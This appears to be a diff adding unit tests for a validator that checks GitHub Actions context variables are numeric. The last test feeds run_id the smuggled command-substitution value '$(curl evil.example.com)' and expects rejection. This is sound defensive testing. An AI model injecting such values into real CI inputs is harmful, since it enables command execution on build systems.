@@ -357,4 +357,85 @@ describe("validateContextVariables", () => {
     expect(mockCore.setFailed).toHaveBeenCalled();
     expect(mockCore.error).toHaveBeenCalledWith(expect.stringContaining("non-numeric"));
   });
+
+  it("should include ERR_VALIDATION prefix in setFailed message", async () => {
+    const ctx = {
+      payload: { issue: { number: "not-a-number" } },
+    };
+
+    await expect(validateContextVariables(mockCore, ctx)).rejects.toThrow();
+    expect(mockCore.setFailed).toHaveBeenCalledTimes(1);
+    expect(mockCore.setFailed).toHaveBeenCalledWith(expect.stringContaining("ERR_VALIDATION"));
+  });
+
+  it("should call setFailed only once on validation failure", async () => {
+    const ctx = {
+      payload: { issue: { number: "inject" } },
+    };
+
+    await expect(validateContextVariables(mockCore, ctx)).rejects.toThrow();
+    expect(mockCore.setFailed).toHaveBeenCalledTimes(1);
+  });
+
+  it("should report zero validated variables when context has no known fields", async () => {
+    const ctx = {};
+
+    await validateContextVariables(mockCore, ctx);
+
+    expect(mockCore.setFailed).not.toHaveBeenCalled();
+    expect(mockCore.info).toHaveBeenCalledWith("Validated 0 context variables");
+    expect(mockCore.info).toHaveBeenCalledWith(expect.stringContaining("✅ All context variables validated successfully"));
+  });
+
+  it("should report the correct count of validated variables", async () => {
+    const ctx = {
+      payload: { issue: { number: 1 }, pull_request: { number: 2 } },
+      run_id: 999,
+    };
+
+    await validateContextVariables(mockCore, ctx);
+
+    expect(mockCore.setFailed).not.toHaveBeenCalled();
+    expect(mockCore.info).toHaveBeenCalledWith("Validated 3 context variables");
+  });
+
+  it("should report all failures when multiple invalid fields are present", async () => {
+    const ctx = {
+      payload: {
+        issue: { number: "bad1" },
+        pull_request: { number: "bad2" },
+        comment: { id: "bad3" },
+      },
+    };
+
+    await expect(validateContextVariables(mockCore, ctx)).rejects.toThrow();
+    expect(mockCore.setFailed).toHaveBeenCalledTimes(1);
+    const failMsg = mockCore.setFailed.mock.calls[0][0];
+    expect(failMsg).toContain("3 malicious or invalid");
+    expect(failMsg).toContain("github.event.issue.number");
+    expect(failMsg).toContain("github.event.pull_request.number");
+    expect(failMsg).toContain("github.event.comment.id");
+  });
+
+  it("should validate run_id and run_number at the top level of context", async () => {
+    const ctx = {
+      run_id: 42,
+      run_number: 7,
+    };
+
+    await validateContextVariables(mockCore, ctx);
+
+    expect(mockCore.setFailed).not.toHaveBeenCalled();
+    expect(mockCore.info).toHaveBeenCalledWith("Validated 2 context variables");
+  });
+
+  it("should fail when run_id contains non-numeric data", async () => {
+    const ctx = {
+      run_id: "$(curl evil.example.com)",
+      run_number: 1,
+    };
+
+    await expect(validateContextVariables(mockCore, ctx)).rejects.toThrow();
+    expect(mockCore.setFailed).toHaveBeenCalledWith(expect.stringContaining("github.run_id"));
+  });
 });
